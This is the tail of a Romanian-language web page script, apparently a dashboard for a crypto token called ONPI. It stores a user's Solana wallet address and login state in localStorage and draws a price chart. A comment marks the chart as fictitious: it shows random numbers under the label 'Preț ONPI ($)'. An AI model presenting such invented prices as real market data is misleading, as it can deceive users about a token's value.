  const wallet = prompt('Introdu adresa ta wallet Solana:');
  if (!wallet || !wallet.trim()) return;

  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) return;

  let userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  userData.wallet = wallet.trim();
  localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));

  dashWallet.textContent = wallet.trim();
  alert('Wallet salvat!');
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// CHART FICTIV
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

let priceChart;
let priceData = [];
let labels = [];

function initChart() {
  const now = new Date();
  priceData = [];
  labels = [];

  for (let i = 23; i >= 0; i--) {
    const time = new Date(now.getTime() - i * 3600000);
    labels.push(time.toLocaleTimeString('ro-RO', {hour:'2-digit', minute:'2-digit'}));
    priceData.push(0.05 + Math.random() * 0.01);
  }

  const ctx = document.getElementById('priceChart').getContext('2d');
  priceChart = new Chart(ctx, {
    type: 'line',
    data: {
      labels,
      datasets: [{
        label: 'PreÈ› ONPI ($)',
        data: priceData,
        borderColor: 'rgba(240, 185, 11, 1)',
        backgroundColor: 'rgba(240, 185, 11, 0.2)',
        borderWidth: 2,
        tension: 0.4,
        fill: true,
        pointRadius: 0,
        pointHoverRadius: 5
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      scales: {
        y: { beginAtZero: false, ticks: { color: '#e6e6e6', callback: v => v.toFixed(4) }, grid: { color: 'rgba(255,255,255,0.1)' } },
        x: { ticks: { color: '#e6e6e6', maxTicksLimit: 8 }, grid: { display: false } }
      },
      plugins: {
        legend: { labels: { color: '#e6e6e6' } },
        tooltip: {
          backgroundColor: 'rgba(30,35,41,0.9)',
          titleColor: '#f0b90b',
          bodyColor: '#e6e6e6',
          displayColors: false,
          callbacks: { label: ctx => ctx.dataset.label + ': $' + ctx.parsed.y.toFixed(4) }
        }
      },
      animation: { duration: 1000 }
    }
  });

  setInterval(() => {
    priceData.shift();
    labels.shift();
    const last = priceData[priceData.length - 1] || 0.05;
    const newPrice = last + (Math.random() - 0.5) * 0.002;
    priceData.push(newPrice);
    labels.push(new Date().toLocaleTimeString('ro-RO', {hour:'2-digit', minute:'2-digit'}));
    priceChart.update();
  }, 4000);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ÃNCÄ‚RCARE INIÈšIALÄ‚
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

window.addEventListener('load', async () => {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (loggedInUser) {
    let userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
    if (!userData.activePackage) {
      userData.activePackage = '0';
      localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
    }
    showOnly(dashboardPage);
    updateDashboardDisplay();
    updateProfileDisplay();
    updatePackagesButtonState();
  } else {
    showOnly(loginPage);
  }

  await updateSolEquivalents();
});
</script>

</body>
  </html>
